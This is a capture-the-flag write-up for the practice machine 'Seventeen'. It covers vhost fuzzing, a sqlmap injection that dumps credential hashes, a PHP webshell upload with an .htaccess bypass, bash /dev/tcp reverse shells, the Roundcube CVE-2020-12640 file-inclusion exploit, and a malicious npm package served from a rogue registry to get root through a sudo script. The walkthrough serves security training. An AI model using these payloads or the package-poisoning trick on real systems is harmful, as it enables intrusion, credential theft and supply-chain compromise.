---
layout: post
title: "seventeen"
date: 2025-08-26 
categories: ctf
---
# seventeen

Summary:

- Fuzzing for subdomains
- searchsploit
- sqlmap boolean based
- file upload bypass
- php webshell
- RCE through [**CVE-2020-12640](https://www.cvedetails.com/cve/CVE-2020-12640/)**
- custom malicious npm package
- running docker
- hosting private repo with verdaccio

First let’s scan the open ports and services:

```bash
sudo nmap -sC -sV 10.10.11.165                   

Host is up (0.026s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 2e:b2:6e:bb:92:7d:5e:6b:36:93:17:1a:82:09:e4:64 (RSA)
|   256 1f:57:c6:53:fc:2d:8b:51:7d:30:42:02:a4:d6:5f:44 (ECDSA)
|_  256 d5:a5:36:38:19:fe:0d:67:79:16:e6:da:17:91:eb:ad (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Let's begin your education with us! 
8000/tcp open  http    Apache httpd 2.4.38
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: 403 Forbidden
Service Info: Host: 172.17.0.3; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.57 seconds
```

Visiting port 80:

![image.png]({{ site.baseurl }}/assets/seventeen//image.png)

On the top left, we also see what seems to be the domain name: seventeen.htb. Let’s add that to our /etc/hosts file.

Clicking around the site, we find no buttons with actual functionalities. Let’s fuzz the page:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://seventeen.htb/FUZZ -ic

css                     [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 19ms]
js                      [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 12ms]
images                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 2119ms]
                        [Status: 200, Size: 20689, Words: 2760, Lines: 533, Duration: 2146ms]
fonts                   [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 24ms]
                        [Status: 200, Size: 20689, Words: 2760, Lines: 533, Duration: 21ms]
sass                    [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 17ms]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 22ms]

```

Nothing here. Let’s fuzz for vhosts as well:

```bash
ffuf -u http://seventeen.htb -H "Host: FUZZ.seventeen.htb" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -fs 20689

exam                    [Status: 200, Size: 17375, Words: 3222, Lines: 348, Duration: 399ms]
```

Let’s add that to our /etc/hosts file now.

Now we visit the site. Clicking on the admin button results in this:

![image.png]({{ site.baseurl }}/assets/seventeen//image%201.png)

We cannot login. Clicking on Exams seems to take us to a search bar. We also get the version of the system at the bottom. 

![image.png]({{ site.baseurl }}/assets/seventeen//image%202.png)

If we view the page source, we see `Exam Reviewer Management System.` Let’s use searchsploit and see if there is an existing exploit:

```bash
searchsploit Exam Reviewer Management System

Exam Reviewer Management System 1.0 - Remote Code Execution (RCE) (Authenticated)                                        | php/webapps/50726.txt
Exam Reviewer Management System 1.0 - ‘id’ SQL Injection                                                             | php/webapps/50725.txt

```

There is an SQL injection. Let’s use that.

```bash
searchsploit -x php/webapps/50725.txt

Parameter: id (GET)

Type: boolean-based blind

Title: AND boolean-based blind - WHERE or HAVING clause

Payload: p=take_exam&id=1' AND 4755=4755 AND 'VHNu'='VHNu

Type: error-based

Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY
clause (FLOOR)

Payload: p=take_exam&id=1' OR (SELECT 8795 FROM(SELECT
COUNT(*),CONCAT(0x71766a7071,(SELECT
(ELT(8795=8795,1))),0x7162716b71,FLOOR(RAND(0)*2))x FROM
INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'MCXA'='MCXA

Type: time-based blind

Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)

Payload: p=take_exam&id=1' AND (SELECT 2206 FROM (SELECT(SLEEP(5)))AhEo)
AND 'vqGg'='vqGg---

*SQLMAP COMMAND*

*# sqlmap -u "127.0.0.1/erms/?p=take_exam&id=1
<http://127.0.0.1/erms/?p=take_exam&id=1>" -p id --dbs --level 3*

```

Let’s use bootlean based with sqlmap. The function is probably the Exams function for search. Let’s type the following URL and turn intercept on:

```bash
http://exam.seventeen.htb/?p=take_exam&id=1
```

Now save the request by right-clicking and copy to file. Now to use sqlmap:

```bash
sqlmap -r req.txt -p id --batch

sqlmap -r req.txt -p id --batch --dbs

[*] db_sfms
[*] erms_db
[*] information_schema
[*] roundcubedb

#most plausible db is erms_db as erms could stand for exam review management system
sqlmap -r req.txt -p id --batch -D erms_db --tables

+---------------+
| category_list |
| exam_list     |
| option_list   |
| question_list |
| system_info   |
| users         |
+---------------+

sqlmap -r req.txt -p id --batch -D erms_db -T users --dump

fc8ec7b43523e186a27f46957818391c | admin
48bb86d036bb993dfdcf7fefdc60cc06 | UndetectableMark
184fe92824bea12486ae9a56050228ee | Stev1992
```

Let’s see if we can get a quick win on the password hashes by trying crackstation:

![image.png]({{ site.baseurl }}/assets/seventeen//image%203.png)

Did not work.

What is also interesting is that the avatar field includes a file path that is:

![image.png]({{ site.baseurl }}/assets/seventeen//image%204.png)

```bash
../oldmanagement/files/avatar.png
```

If we assume the normal website is /var/www/html, this might suggest there is another vhost:

```bash
#filepath
/var/www/oldmanagement

#vhost name
oldmanagement.seventeen.htb
```

Let’s add that to /etc/hosts and visit the URL:

![image.png]({{ site.baseurl }}/assets/seventeen//image%205.png)

It exists, and we are on port 8000.

Looking at the name of the system, we remember that the mysql has another dbs named db_sfms, let’s also dump that:

```bash
sqlmap -r req.txt -p id --batch -D db_sfms --tables

+---------+
| storage |
| user    |
| student |
+---------+

```

both student and user looks interesting, let’s dump both:

```bash
sqlmap -r req.txt -p id --batch -D db_sfms -T user,student --dump

user table:
fc8ec7b43523e186a27f46957818391c | admin
b35e311c80075c4916935cbbbd770cef | UndetectableMark
112dd9d08abf9dcceec8bc6d3e26b138 | Stev1992
```

Student table:

![image.png]({{ site.baseurl }}/assets/seventeen//image%206.png)

We want to match the field that is on the login page:

```bash
stud_no:password

12345:1a40620f9a4ed6cb8d81a1d365559233
23347:abb635c915b0cc296e071e8d76e9060c
31234:a2afa567b1efdb42d8966353337d9024 (autodestruction)
43347:a1428092eb55781de5eb4fd5e2ceb835
```

sqlmap already decoded student 3. Let’s try to login to sfms with that credential:

```bash
31234:autodestruction
```

![image.png]({{ site.baseurl }}/assets/seventeen//image%207.png)

After downloading the invoice, we find a new subdomain:

```bash
http://mastermailer.seventeen.htb/
```

![image.png]({{ site.baseurl }}/assets/seventeen//image%208.png)

Let’s also add that to /etc/hosts file and visit the URL:

![image.png]({{ site.baseurl }}/assets/seventeen//image%209.png)

Think back to all the dbs, we have one more non-default which is roundcubedb. The logo looks like that, let’s see what tables exist:

```bash
sqlmap -r req.txt --batch -D roundcubedb --tables
```

Nothing useful was found. At this point there are multiple ways of getting a foothold. 

Option 1 - Bypass file upload restrictions and upload malicious php code to get reverse shell.

Option 2 - Exploiting roundcube 1.4.2

### Option 1:

Let’s try option 1 first. Back on the SFMS, we have a function to upload files:

![image.png]({{ site.baseurl }}/assets/seventeen//image%207.png)

We can find the source code for this site by searching up School File management System source code 2019. After downloading, the file that is most likely the function that deals with saving file, is save_file.php:

```bash
<?php
        require_once 'admin/conn.php';

        if(ISSET($_POST['save'])){
                $stud_no = $_POST['stud_no'];
                $file_name = $_FILES['file']['name'];
                $file_type = $_FILES['file']['type'];
                $file_temp = $_FILES['file']['tmp_name'];
                $location = "files/".$stud_no."/".$file_name;
                $date = date("Y-m-d, h:i A", strtotime("+8 HOURS"));
                if(!file_exists("files/".$stud_no)){
                        mkdir("files/".$stud_no);
                }

                if(move_uploaded_file($file_temp, $location)){
                        mysqli_query($conn, "INSERT INTO `storage` VALUES('', '$file_name', '$file_type', '$date', '$stud_no')") or die(mysqli_error());
                        header('location: student_profile.php');
                }
        }
?>
```

Essentially, all the code is doing when a new file is uploaded, it saves it into files/[stud_no]/[filename]

e.g. if we were to upload a php file as stud_no 31234, the file path would be:

```bash
http://oldmanagement.seventeen.htb:8000/oldmanagement/files/31234/file.php
```

Let’s make a simple php webshell and test if it works.

```bash
<? system($_REQUEST['cmd']); ?>
```

Now let’s attempt to visit:

```bash
http://oldmanagement.seventeen.htb:8000/oldmanagement/files/31234/file.php
```

![image.png]({{ site.baseurl }}/assets/seventeen//image%2010.png)

One way to bypass this is to upload a new .htacess file, which overwrites the original, which is preventing us from executing php code.

Now let’s reupload our webshell and capture the request on burp, and send it to repeater

![image.png]({{ site.baseurl }}/assets/seventeen//image%2011.png)

Now we can just upload an empty file named: .htaccess

![image.png]({{ site.baseurl }}/assets/seventeen//image%2012.png)

Now let’s visit our webshell again:

```bash
http://oldmanagement.seventeen.htb:8000/oldmanagement/files/31234/file.php?cmd=id
```

![image.png]({{ site.baseurl }}/assets/seventeen//image%2013.png)

We now have shell. Another around this is by simply creating a web shell as a new user, as in save_file.php, this part of the code is flawed. If a new user with a new stud_no were to create a file, the server would create a brand new directory with that stud_no, with no .htaccess to restrict php code execution.

```bash
                if(!file_exists("files/".$stud_no)){
                        mkdir("files/".$stud_no);
                }

```

For example:

![image.png]({{ site.baseurl }}/assets/seventeen//image%2014.png)

Now we go:

```bash
http://oldmanagement.seventeen.htb:8000/oldmanagement/files/18940/test.php?cmd=id
```

We get:

![image.png]({{ site.baseurl }}/assets/seventeen//image%2015.png)

Now we can get a reverse shell by URL encoding the following:

```bash
bash -c 'bash -i >& /dev/tcp/10.10.16.6/4444 0>&1'
```

Now send our GET request to repeater, change HTTP Method to POST, and URL encode the command with Ctrl+U:

![image.png]({{ site.baseurl }}/assets/seventeen//image%2016.png)

Start listener before hitting send:

```bash
nc -lnvp 4444
```

![image.png]({{ site.baseurl }}/assets/seventeen//image%2017.png)

Now to upgrade the shell:

```bash
script /dev/null -c bash
ctrl-z
stty raw -echo; fg
Enter twice
```

### Option 2:

First we find the version of roundcube. We know from the message:

![image.png]({{ site.baseurl }}/assets/seventeen//image%208.png)

the roundcube application is the newest at that time, which the file was uploaded on:

![image.png]({{ site.baseurl }}/assets/seventeen//image%2018.png)

Searching for that year and month, and roundcube version on Google, we got version 1.4.2. (Another way to find the version is searching up roundcube github and seeing that there is CHANGELOG file, visiting that dir will reveal version 1.4.2)Thereafter, searching roundcube 1.4.2 exploit got to this site https://www.cvedetails.com/version/1406193/Roundcube-Webmail-1.4.2.html

Then we found this CVE https://www.cvedetails.com/version/1406193/Roundcube-Webmail-1.4.2.html,

where by searching up the [**CVE-2020-12640](https://www.cvedetails.com/cve/CVE-2020-12640/) github, we eventually find** https://github.com/DrunkenShells/Disclosures/tree/master/CVE-2020-12640-PHP%20Local%20File%20Inclusion-Roundcube

This exploit requires the /installer to be present, we can check by:

```bash
http://mastermailer.seventeen.htb:8000/mastermailer/installer
```

![image.png]({{ site.baseurl }}/assets/seventeen//image%2019.png)

Now we have to fuzz the stud_no directory to see if there are any directories that exist, if there is, we have to name the php code the same name as that dir:

```bash
gobuster dir -u http://oldmanagement.seventeen.htb:8000/oldmanagement/files/31234 -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt -d 

papers/
```

Now we have to upload a file papers.php. Let’s get a straight reverse shell this time:

```bash
<?php system("bash -c 'bash -i >& /dev/tcp/10.10.16.6/4444 0>&1'"); ?>
```

Now upload papers.php

![image.png]({{ site.baseurl }}/assets/seventeen//image%2020.png)

Now let’s turn on intercept and capture a request from installer:

```bash
http://mastermailer.seventeen.htb:8000/mastermailer/installer/index.php?_step=2
```

Now click update config:

![image.png]({{ site.baseurl }}/assets/seventeen//image%2021.png)

Send the request to repeater and change the value of _step2  to this:

```bash
_step=2&_product_name=Roundcube+Webmail&***TRUNCATED***&_plugins_qwerty=../../../../../../../../../../var/www/html/oldmanagement/files/31234/papers&submit=UPDATE+CONFIG
```

![image.png]({{ site.baseurl }}/assets/seventeen//image%2022.png)

![image.png]({{ site.baseurl }}/assets/seventeen//image%2023.png)

Finally, let’s start listener and visit:

```bash
nc -lnvp 4444
```

```bash
http://mastermailer.seventeen.htb:8000/mastermailer
```

![image.png]({{ site.baseurl }}/assets/seventeen//image%2024.png)

We now have shell.

```bash
script /dev/null -c bash
ctrl-z
stty raw -echo; fg
Enter twice
```

Let’s enumerate and look for credentials:

```bash
www-data@da401b80fad1:/var/www/html/employeemanagementsystem$ cat process/dbh.php

$servername = "localhost";
$dBUsername = "root";
$dbPassword = "2020bestyearofmylife";
$dBName = "ems";

```

Let’s see if the password is reused.

Looking at /etc/passwd we find user mark:

```bash
mark:x:1000:1000:,,,:/var/www/html:/bin/bash
```

Let’s attempt to ssh:

```bash
ssh mark@10.10.11.165
```

We are in.

Simple enumeration revealed nothing, we are not sudoers or privileged groups. We did not find anything useful in our home dir. Looking at /home, we find user kavi. Let’s see what files this user owns:

```bash
find / -user kavi -ls 2>/dev/null

   663205      4 drwxr-x---   7 kavi     kavi         4096 May 11  2022 /home/kavi

   133787      4 -rw-r--r--   1 kavi     mail          740 Mar 14  2022 /var/mail/kavi

find / -group kavi 2>/dev/null
```

Let’s look at /var/mail/kavi

```bash
To: kavi@seventeen.htb
From: admin@seventeen.htb
Subject: New staff manager application

Hello Kavishka,

Sorry I couldn't reach you sooner. Good job with the design. I loved it. 

I think Mr. Johnson already told you about our new staff management system. Since our old one had some problems, they are hoping maybe we could migrate to a more modern one. For the first phase, he asked us just a simple web UI to store the details of the staff members.

I have already done some server-side for you. Even though, I did come across some problems with our private registry. However as we agreed, I removed our old logger and added loglevel instead. You just have to publish it to our registry and test it with the application. 

Cheers,
Mike

```

loglevel is an npm package. The message also suggest there is a private registry, so let’s search for it:

```bash
ss -lntp

State              Recv-Q               Send-Q                              Local Address:Port                              Peer Address:Port              
LISTEN             0                    80                                     172.18.0.1:3306                                   0.0.0.0:*                 
LISTEN             0                    128                                     127.0.0.1:42861                                  0.0.0.0:*                 
LISTEN             0                    100                                     127.0.0.1:110                                    0.0.0.0:*                 
LISTEN             0                    100                                     127.0.0.1:143                                    0.0.0.0:*                 
LISTEN             0                    128                                     127.0.0.1:6000                                   0.0.0.0:*                 
LISTEN             0                    128                                       0.0.0.0:80                                     0.0.0.0:*                 
LISTEN             0                    128                                     127.0.0.1:6001                                   0.0.0.0:*                 
LISTEN             0                    128                                     127.0.0.1:8081                                   0.0.0.0:*                 
LISTEN             0                    128                                     127.0.0.1:6002                                   0.0.0.0:*                 
LISTEN             0                    128                                     127.0.0.1:6003                                   0.0.0.0:*                 
LISTEN             0                    128                                     127.0.0.1:6004                                   0.0.0.0:*                 
LISTEN             0                    128                                     127.0.0.1:6005                                   0.0.0.0:*                 
LISTEN             0                    128                                 127.0.0.53%lo:53                                     0.0.0.0:*                 
LISTEN             0                    128                                     127.0.0.1:6006                                   0.0.0.0:*                 
LISTEN             0                    128                                       0.0.0.0:22                                     0.0.0.0:*                 
LISTEN             0                    128                                     127.0.0.1:6007                                   0.0.0.0:*                 
LISTEN             0                    128                                     127.0.0.1:6008                                   0.0.0.0:*                 
LISTEN             0                    128                                     127.0.0.1:6009                                   0.0.0.0:*                 
LISTEN             0                    100                                     127.0.0.1:993                                    0.0.0.0:*                 
LISTEN             0                    100                                     127.0.0.1:995                                    0.0.0.0:*                 
LISTEN             0                    128                                     127.0.0.1:4873                                   0.0.0.0:*
```

Now using curl to send requests, we find one odd one 4873:

```bash
curl http://localhost:4873

    <!DOCTYPE html>
      <html lang="en-us"> 
      <head>
        <meta charset="utf-8">
        <base href="http://localhost:4873/">
        <title>Verdaccio</title>        
        <link rel="icon" href="http://localhost:4873/-/static/favicon.ico"/>
        <meta name="viewport" content="width=device-width, initial-scale=1" /> 
        <script>
            window.__VERDACCIO_BASENAME_UI_OPTIONS={"darkMode":false,"basename":"/","base":"http://localhost:4873/","primaryColor":"#4b5e40","version":"5.6.0","pkgManagers":["yarn","pnpm","npm"],"login":true,"logo":"","title":"Verdaccio","scope":"","language":"es-US"}
        </script>
        
      </head>    
      <body class="body">
      
        <div id="root"></div>
        <script defer="defer" src="http://localhost:4873/-/static/runtime.06493eae2f534100706f.js"></script><script defer="defer" src="http://localhost:4873/-/static/vendors.06493eae2f534100706f.js"></script><script defer="defer" src="http://localhost:4873/-/static/main.06493eae2f534100706f.js"></script>
        
      </body>
    </html>

```

Veradaccio is a private registry, therefore, now we know where we can use npm to install packages. Let’s see what packages are available

```bash
npm search --registry=http://127.0.0.1:4873

db-logger            Log data to a database                                       =kavigihan         2022-03-15 1.0.1   log 
```

We find one that is authored by kavi. Let’s download that:

```bash
npm install db-logger --registry=http://127.0.0.1:4873
```

After installing and going into db-logger directory, we find a logger.js, where we find credentials:

```bash
var con = mysql.createConnection({
  host: "localhost",
  user: "root",
  password: "IhateMathematics123#",
  database: "logger"
});

```

Let’s switch user:

```bash
su kavi
```

We are now kavi. Executing sudo -l, we find:

```bash
User kavi may run the following commands on seventeen:
    (ALL) /opt/app/startup.sh

```

```bash
kavi@seventeen:/home/mark/node_modules/db-logger$ cat /opt/app/startup.sh 
#!/bin/bash

cd /opt/app

deps=('db-logger' 'loglevel')

for dep in ${deps[@]}; do
    /bin/echo "[=] Checking for $dep"
    o=$(/usr/bin/npm -l ls|/bin/grep $dep)

    if [[ "$o" != *"$dep"* ]]; then
        /bin/echo "[+] Installing $dep"
        /usr/bin/npm install $dep --silent
        /bin/chown root:root node_modules -R
    else
        /bin/echo "[+] $dep already installed"

    fi
done

/bin/echo "[+] Starting the app"

/usr/bin/node /opt/app/index.js
kavi@seventeen:/home/mark/node_modules/db-logger$ ls -l /opt/app/startup.sh
-rwxr-xr-x 1 root root 465 May 29  2022 /opt/app/startup.sh

```

We also find out that even though npm is used to download the modules, it does not specify a private registry. That’s because it is specified in the .npmrc:

```bash
registry=http://127.0.0.1:4873/
```

We can try pointing the registry to our attack box, and install a malicious version of loglevel. This trick only works as we are on VERSION="18.04.6 LTS (Bionic Beaver)", as prior to 19.10,  sudo preserves the environment variable by default, so our user kavi’s environment variable will be used.

Edited .npmrc:

```bash
echo 'registry=http://10.10.16.12:4873/' > ~/.npmrc
```

Let’s set up a private registry now using verdaccio on our attack host:

```bash
sudo apt install docker.io
sudo docker pull verdaccio/verdaccio
sudo docker run -it --rm -p 4873:4873 verdaccio/verdaccio
```

Now we can make our malicious package, name a file index.js:

```bash
require("child_process").exec("bash -c 'bash -i >& /dev/tcp/10.10.16.6/9001 0>&1'")
function log(msg) {
	console.log("[+] " + msg)
}
module.exports.log = log
```

Now we can create the package and publish our local registry:

```bash
nmp init

#just enter a name and version
{
  "name": "loglevel",
  "version": "1.9.2", #version has to be larger than normal one
  "main": "index.js",
  "scripts": {
    "test": "echo \"Error: no test specified\" && exit 1"
  },
  "author": "",
  "license": "ISC",
  "description": ""
}

```

In order to publish onto the repo, we first have to create a user:

```bash
npm adduser --registry http://10.10.16.12:4873 --auth-type=legacy

npm notice Log in on http://10.10.16.12:4873/
Username: test
Password: 
Email: (this IS public) test@test.htb
Logged in on http://10.10.16.12:4873/.

```

Now let’s publish:

```bash
npm version patch
npm publish --registry http://10.10.16.12:4873 
```

Now we can set up our local listener to catch the reverse shell:

```bash
nc -lnvp 9001
```

Now start the [startup.sh](http://startup.sh) script:

```bash
sudo /opt/app/startup.sh #IhateMathematics123#
```

Received a shell but it’s not working. Let’s just create a setuid shell binary.

Our new index.js:

```bash
require("child_process").exec("chown root:root /tmp/shell; chmod 4755 /tmp/shell")

```

Now let’s publish it again:

```bash
npm version patch
npm publish --registry http://10.10.16.12:4873 
```

Now on the target, let’s copy a bash binary to /tmp:

```bash
which bash

/bin/bash

cp /bin/bash /tmp/shell
```

Now let’s make sure the environmental variable is not overwritten and execute the sudo again:

```bash
echo 'registry=http://10.10.16.12:4873/' > ~/.npmrc
sudo /opt/app/startup.sh
```

We see it downloading our version of loglevel, then checking /tmp/shell, we have our SUID set binary.

![image.png]({{ site.baseurl }}/assets/seventeen//image%2025.png)